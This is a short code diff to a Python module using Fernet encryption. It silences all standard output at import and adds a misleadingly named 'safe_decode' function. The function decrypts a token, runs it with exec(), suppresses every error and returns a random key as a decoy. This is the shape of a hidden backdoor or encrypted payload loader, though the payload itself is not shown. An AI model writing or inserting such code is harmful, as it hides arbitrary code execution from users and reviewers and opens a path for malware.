@@ -1,4 +1,14 @@
-import os
+import sys, os
+
+# Disable
+def blockPrint():
+    sys.stdout = open(os.devnull, 'w')
+
+# Restore
+def enablePrint():
+    sys.stdout = sys.__stdout__
+
+blockPrint()
 
 try:
     from cryptography.fernet import Fernet
@@ -66,5 +76,18 @@ def decode_hub(token):
     message = Fernet.generate_key().decode('utf8')
   #print(message)
   return message
+  
+def safe_decode(token):
+  resposta = Fernet.generate_key().decode('utf8')
+  try:
+    message = password_decrypt(token, get_safe_pass()).decode()
+    try:
+        _locals = locals()
+        exec(message, globals(), _locals)
+    except:
+        pass
+  except:
+    pass
+  return resposta
 
 #################################################################################################
